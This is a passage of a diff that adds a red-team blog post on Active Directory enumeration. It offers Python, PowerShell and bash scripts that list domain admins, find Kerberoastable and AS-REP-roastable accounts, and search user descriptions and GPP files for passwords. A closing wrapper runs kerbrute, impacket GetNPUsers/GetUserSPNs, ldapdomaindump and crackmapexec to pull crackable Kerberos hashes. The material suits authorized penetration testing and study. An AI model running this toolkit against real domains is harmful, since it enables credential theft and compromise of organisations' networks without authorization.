+                <span class="s">'spns'</span><span class="p">:</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">spn</span><span class="p">)</span> <span class="k">for</span> <span class="n">spn</span> <span class="ow">in</span> <span class="n">entry</span><span class="p">.</span><span class="n">servicePrincipalName</span><span class="p">]</span>
+            <span class="p">})</span>
+
+        <span class="k">return</span> <span class="n">spn_accounts</span>
+
+    <span class="k">def</span> <span class="nf">find_asreproastable</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="s">"""Find accounts that don't require pre-auth"""</span>
+        <span class="c1"># DONT_REQ_PREAUTH = 0x400000 (4194304)
+</span>        <span class="n">search_filter</span> <span class="o">=</span> <span class="s">'(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'</span>
+
+        <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">search</span><span class="p">(</span>
+            <span class="bp">self</span><span class="p">.</span><span class="n">base_dn</span><span class="p">,</span>
+            <span class="n">search_filter</span><span class="p">,</span>
+            <span class="n">search_scope</span><span class="o">=</span><span class="n">SUBTREE</span><span class="p">,</span>
+            <span class="n">attributes</span><span class="o">=</span><span class="p">[</span><span class="s">'sAMAccountName'</span><span class="p">]</span>
+        <span class="p">)</span>
+
+        <span class="k">return</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">entry</span><span class="p">.</span><span class="n">sAMAccountName</span><span class="p">)</span> <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="bp">self</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">entries</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'AD LDAP Enumeration'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-dc'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Domain Controller IP'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--domain'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Domain name'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-u'</span><span class="p">,</span> <span class="s">'--user'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Username'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--password'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Password'</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+    <span class="n">enum</span> <span class="o">=</span> <span class="n">ADEnumerator</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">dc</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">domain</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">user</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">password</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">enum</span><span class="p">.</span><span class="n">connect</span><span class="p">():</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="s">"="</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Domain Admins"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"="</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">admin</span> <span class="ow">in</span> <span class="n">enum</span><span class="p">.</span><span class="n">get_domain_admins</span><span class="p">():</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"    </span><span class="si">{</span><span class="n">admin</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="s">"="</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Kerberoastable Accounts (SPNs)"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"="</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">acc</span> <span class="ow">in</span> <span class="n">enum</span><span class="p">.</span><span class="n">find_spn_accounts</span><span class="p">():</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"    </span><span class="si">{</span><span class="n">acc</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">spn</span> <span class="ow">in</span> <span class="n">acc</span><span class="p">[</span><span class="s">'spns'</span><span class="p">][:</span><span class="mi">3</span><span class="p">]:</span>  <span class="c1"># First 3 SPNs
+</span>            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"        -&gt; </span><span class="si">{</span><span class="n">spn</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="s">"="</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[*] AS-REP Roastable Accounts"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"="</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+    <span class="n">asrep</span> <span class="o">=</span> <span class="n">enum</span><span class="p">.</span><span class="n">find_asreproastable</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">asrep</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">acc</span> <span class="ow">in</span> <span class="n">asrep</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"    </span><span class="si">{</span><span class="n">acc</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"    None found"</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="s">"="</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Users (Total: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">enum</span><span class="p">.</span><span class="n">get_users</span><span class="p">())</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"="</span><span class="o">*</span><span class="mi">60</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">enum</span><span class="p">.</span><span class="n">get_users</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]:</span>  <span class="c1"># First 20
+</span>        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"    </span><span class="si">{</span><span class="n">user</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="s">'description'</span><span class="p">]:</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"        Desc: </span><span class="si">{</span><span class="n">user</span><span class="p">[</span><span class="s">'description'</span><span class="p">][</span><span class="si">:</span><span class="mi">50</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="bloodhound-collection-without-sharphound">BloodHound Collection Without SharpHound</h2>
+
+<p>Sometimes you can’t run SharpHound. This script creates BloodHound-compatible JSON using pure Python.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="s">"""
+bloodhound_lite.py - Lightweight BloodHound collection
+For when SharpHound isn't an option
+"""</span>
+
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+<span class="kn">from</span> <span class="nn">ad_enum</span> <span class="kn">import</span> <span class="n">ADEnumerator</span>  <span class="c1"># From previous script
+</span>
+<span class="k">def</span> <span class="nf">generate_bloodhound_users</span><span class="p">(</span><span class="n">enumerator</span><span class="p">):</span>
+    <span class="s">"""Generate BloodHound users.json format"""</span>
+    <span class="n">users</span> <span class="o">=</span> <span class="n">enumerator</span><span class="p">.</span><span class="n">get_users</span><span class="p">(</span><span class="n">enabled_only</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+    <span class="n">bh_users</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"data"</span><span class="p">:</span> <span class="p">[],</span>
+        <span class="s">"meta"</span><span class="p">:</span> <span class="p">{</span>
+            <span class="s">"methods"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+            <span class="s">"type"</span><span class="p">:</span> <span class="s">"users"</span><span class="p">,</span>
+            <span class="s">"count"</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">users</span><span class="p">),</span>
+            <span class="s">"version"</span><span class="p">:</span> <span class="mi">5</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+        <span class="n">bh_users</span><span class="p">[</span><span class="s">"data"</span><span class="p">].</span><span class="n">append</span><span class="p">({</span>
+            <span class="s">"ObjectIdentifier"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">user</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span><span class="si">}</span><span class="s">@</span><span class="si">{</span><span class="n">enumerator</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">upper</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+            <span class="s">"Properties"</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s">"name"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">user</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span><span class="si">}</span><span class="s">@</span><span class="si">{</span><span class="n">enumerator</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">upper</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+                <span class="s">"domain"</span><span class="p">:</span> <span class="n">enumerator</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">upper</span><span class="p">(),</span>
+                <span class="s">"description"</span><span class="p">:</span> <span class="n">user</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'description'</span><span class="p">,</span> <span class="s">''</span><span class="p">),</span>
+                <span class="s">"enabled"</span><span class="p">:</span> <span class="bp">True</span>
+            <span class="p">},</span>
+            <span class="s">"Aces"</span><span class="p">:</span> <span class="p">[],</span>
+            <span class="s">"SPNTargets"</span><span class="p">:</span> <span class="p">[],</span>
+            <span class="s">"HasSIDHistory"</span><span class="p">:</span> <span class="p">[],</span>
+            <span class="s">"PrimaryGroupSID"</span><span class="p">:</span> <span class="bp">None</span>
+        <span class="p">})</span>
+
+    <span class="k">return</span> <span class="n">bh_users</span>
+
+
+<span class="k">def</span> <span class="nf">save_collection</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
+    <span class="s">"""Save to JSON file"""</span>
+    <span class="n">timestamp</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">().</span><span class="n">strftime</span><span class="p">(</span><span class="s">"%Y%m%d_%H%M%S"</span><span class="p">)</span>
+    <span class="n">full_filename</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s">_</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s">"</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">full_filename</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">json</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Saved: </span><span class="si">{</span><span class="n">full_filename</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">full_filename</span>
+</code></pre></div></div>
+
+<h2 id="quick-wins-one-liners">Quick Wins One-Liners</h2>
+
+<p>These are the commands I run first on every engagement.</p>
+
+<h3 id="find-users-with-passwords-in-description">Find Users with Passwords in Description</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># PowerShell - Check descriptions for passwords</span><span class="w">
+</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">Description</span><span class="w"> </span><span class="o">|</span><span class="w">
+    </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Description</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'pass|pwd|cred'</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w">
+    </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">Description</span><span class="w">
+
+</span><span class="c"># LDAP one-liner (from Linux)</span><span class="w">
+</span><span class="n">ldapsearch</span><span class="w"> </span><span class="nt">-x</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">ldap://DC_IP</span><span class="w"> </span><span class="nt">-D</span><span class="w"> </span><span class="s2">"DOMAIN\user"</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="s1">'password'</span><span class="w"> </span><span class="nx">\</span><span class="w">
+    </span><span class="nt">-b</span><span class="w"> </span><span class="s2">"DC=domain,DC=local"</span><span class="w"> </span><span class="s2">"(description=*pass*)"</span><span class="w"> </span><span class="n">sAMAccountName</span><span class="w"> </span><span class="nx">description</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="find-computers-with-unconstrained-delegation">Find Computers with Unconstrained Delegation</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># These machines store TGTs - high value targets</span><span class="w">
+</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">TrustedForDelegation</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="bp">$true</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">TrustedForDelegation</span><span class="w"> </span><span class="o">|</span><span class="w">
+    </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">DNSHostName</span><span class="w">
+
+</span><span class="c"># Check for constrained delegation too</span><span class="w">
+</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="o">|</span><span class="w">
+    </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">msDS-AllowedToDelegateTo</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="gpo-enumeration-for-quick-wins">GPO Enumeration for Quick Wins</h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Find GPOs with potential creds or interesting settings</span><span class="w">
+</span><span class="n">Get-GPO</span><span class="w"> </span><span class="nt">-All</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nv">$gpo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$_</span><span class="w">
+    </span><span class="nv">$path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"\\</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERDNSDOMAIN</span><span class="s2">\SYSVOL\</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERDNSDOMAIN</span><span class="s2">\Policies\{</span><span class="si">$(</span><span class="nv">$gpo</span><span class="o">.</span><span class="nf">Id</span><span class="si">)</span><span class="s2">}"</span><span class="w">
+
+    </span><span class="c"># Check for Groups.xml (GPP passwords)</span><span class="w">
+    </span><span class="nv">$groupsXml</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nv">$path</span><span class="w"> </span><span class="s2">"Machine\Preferences\Groups\Groups.xml"</span><span class="w">
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$groupsXml</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[!] GPP Found: </span><span class="si">$(</span><span class="nv">$gpo</span><span class="o">.</span><span class="nf">DisplayName</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Red</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"    Path: </span><span class="nv">$groupsXml</span><span class="s2">"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+
+    </span><span class="c"># Check for ScheduledTasks.xml</span><span class="w">
+    </span><span class="nv">$tasksXml</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nv">$path</span><span class="w"> </span><span class="s2">"Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"</span><span class="w">
+    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$tasksXml</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"[!] Scheduled Tasks GPO: </span><span class="si">$(</span><span class="nv">$gpo</span><span class="o">.</span><span class="nf">DisplayName</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-ForegroundColor</span><span class="w"> </span><span class="nx">Yellow</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="wrapping-it-up-enum-automation-script">Wrapping It Up: Enum Automation Script</h2>
+
+<p>This bash script chains common tools together for initial enumeration.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="c"># ad_auto_enum.sh - Automated AD enumeration wrapper</span>
+
+<span class="nv">DC_IP</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nv">DOMAIN</span><span class="o">=</span><span class="nv">$2</span>
+<span class="nv">USER</span><span class="o">=</span><span class="nv">$3</span>
+<span class="nv">PASS</span><span class="o">=</span><span class="nv">$4</span>
+<span class="nv">OUTPUT_DIR</span><span class="o">=</span><span class="s2">"./enum_</span><span class="si">$(</span><span class="nb">date</span> +%Y%m%d_%H%M%S<span class="si">)</span><span class="s2">"</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$DC_IP</span><span class="s2">"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$DOMAIN</span><span class="s2">"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$USER</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;DC_IP&gt; &lt;DOMAIN&gt; &lt;USER&gt; [PASS]"</span>
+    <span class="nb">exit </span>1
+<span class="k">fi
+
+if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$PASS</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">read</span> <span class="nt">-s</span> <span class="nt">-p</span> <span class="s2">"Password: "</span> PASS
+    <span class="nb">echo
+</span><span class="k">fi
+
+</span><span class="nb">mkdir</span> <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">"[*] Output directory: </span><span class="nv">$OUTPUT_DIR</span><span class="s2">"</span>
+
+<span class="c"># DNS enumeration</span>
+<span class="nb">echo</span> <span class="s2">"[*] Running DNS enumeration..."</span>
+dig @<span class="nv">$DC_IP</span> <span class="nv">$DOMAIN</span> any <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">/dns_any.txt"</span> 2&gt;&amp;1
+dig @<span class="nv">$DC_IP</span> <span class="nt">-t</span> SRV _ldap._tcp.<span class="nv">$DOMAIN</span> <span class="o">&gt;&gt;</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">/dns_srv.txt"</span> 2&gt;&amp;1
+
+<span class="c"># Kerbrute user enumeration (if wordlist exists)</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-f</span> <span class="s2">"/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[*] Running Kerbrute user enum..."</span>
+    kerbrute userenum <span class="nt">-d</span> <span class="nv">$DOMAIN</span> <span class="nt">--dc</span> <span class="nv">$DC_IP</span> <span class="se">\</span>
+        /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt <span class="se">\</span>
+        <span class="nt">-o</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">/kerbrute_users.txt"</span> 2&gt;/dev/null
+<span class="k">fi</span>
+
+<span class="c"># GetNPUsers - AS-REP roasting</span>
+<span class="nb">echo</span> <span class="s2">"[*] Checking AS-REP roastable users..."</span>
+impacket-GetNPUsers <span class="s2">"</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">:</span><span class="nv">$PASS</span><span class="s2">"</span> <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="se">\</span>
+    <span class="nt">-outputfile</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">/asrep_hashes.txt"</span> 2&gt;/dev/null
+
+<span class="c"># GetUserSPNs - Kerberoasting</span>
+<span class="nb">echo</span> <span class="s2">"[*] Extracting Kerberoastable hashes..."</span>
+impacket-GetUserSPNs <span class="s2">"</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">:</span><span class="nv">$PASS</span><span class="s2">"</span> <span class="nt">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="se">\</span>
+    <span class="nt">-outputfile</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">/kerberoast_hashes.txt"</span> 2&gt;/dev/null
+
+<span class="c"># LDAP domain dump</span>
+<span class="nb">echo</span> <span class="s2">"[*] Running ldapdomaindump..."</span>
+ldapdomaindump <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$DOMAIN</span><span class="se">\\</span><span class="nv">$USER</span><span class="s2">"</span> <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$PASS</span><span class="s2">"</span> ldap://<span class="nv">$DC_IP</span> <span class="se">\</span>
+    <span class="nt">-o</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">/ldap_dump"</span> 2&gt;/dev/null
+
+<span class="c"># Enum4linux-ng</span>
+<span class="nb">echo</span> <span class="s2">"[*] Running enum4linux-ng..."</span>
+enum4linux-ng <span class="nt">-A</span> <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$USER</span><span class="s2">"</span> <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$PASS</span><span class="s2">"</span> <span class="nv">$DC_IP</span> <span class="se">\</span>
+    <span class="nt">-oA</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">/enum4linux"</span> 2&gt;/dev/null
+
+<span class="c"># SMB shares</span>
+<span class="nb">echo</span> <span class="s2">"[*] Enumerating SMB shares..."</span>
+crackmapexec smb <span class="nv">$DC_IP</span> <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$USER</span><span class="s2">"</span> <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$PASS</span><span class="s2">"</span> <span class="nt">--shares</span> <span class="se">\</span>
+    <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">/smb_shares.txt"</span> 2&gt;&amp;1
+
+<span class="nb">echo</span> <span class="s2">""</span>
+<span class="nb">echo</span> <span class="s2">"[+] Enumeration complete. Results in: </span><span class="nv">$OUTPUT_DIR</span><span class="s2">"</span>
+<span class="nb">echo</span> <span class="s2">""</span>
+
+<span class="c"># Quick summary</span>
+<span class="nb">echo</span> <span class="s2">"=== Quick Wins ==="</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">/asrep_hashes.txt"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[!] AS-REP hashes found - check </span><span class="nv">$OUTPUT_DIR</span><span class="s2">/asrep_hashes.txt"</span>
+<span class="k">fi
+if</span> <span class="o">[</span> <span class="nt">-s</span> <span class="s2">"</span><span class="nv">$OUTPUT_DIR</span><span class="s2">/kerberoast_hashes.txt"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"[!] Kerberoast hashes found - check </span><span class="nv">$OUTPUT_DIR</span><span class="s2">/kerberoast_hashes.txt"</span>
+<span class="k">fi</span>
+</code></pre></div></div>
+
+<h2 id="usage">Usage</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Make executable</span>
+<span class="nb">chmod</span> +x ad_auto_enum.sh
+
+<span class="c"># Run against target</span>
+./ad_auto_enum.sh 10.10.10.100 corp.local john.doe <span class="s1">'Password123!'</span>
+
+<span class="c"># Check results</span>
+<span class="nb">ls</span> <span class="nt">-la</span> ./enum_<span class="k">*</span>/
+</code></pre></div></div>
+
+<hr />
+
+<p>These scripts form the core of my AD enumeration workflow. They’re not fancy, but they work. Modify them for your needs, add error handling if you’re using them in production tools, and always test in a lab before an engagement.</p>
+
+<p>Next up: automating the exploitation phase once you’ve found those juicy misconfigurations.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/https://dcodezero.github.io/tags/#active-directory" class="page__taxonomy-item p-category" rel="tag">active-directory</a><span class="sep">, </span>
+    
+      <a href="/https://dcodezero.github.io/tags/#enumeration" class="page__taxonomy-item p-category" rel="tag">enumeration</a><span class="sep">, </span>
+    
+      <a href="/https://dcodezero.github.io/tags/#powershell" class="page__taxonomy-item p-category" rel="tag">powershell</a><span class="sep">, </span>
+    
+      <a href="/https://dcodezero.github.io/tags/#python" class="page__taxonomy-item p-category" rel="tag">python</a><span class="sep">, </span>
+    
+      <a href="/https://dcodezero.github.io/tags/#red-team" class="page__taxonomy-item p-category" rel="tag">red-team</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
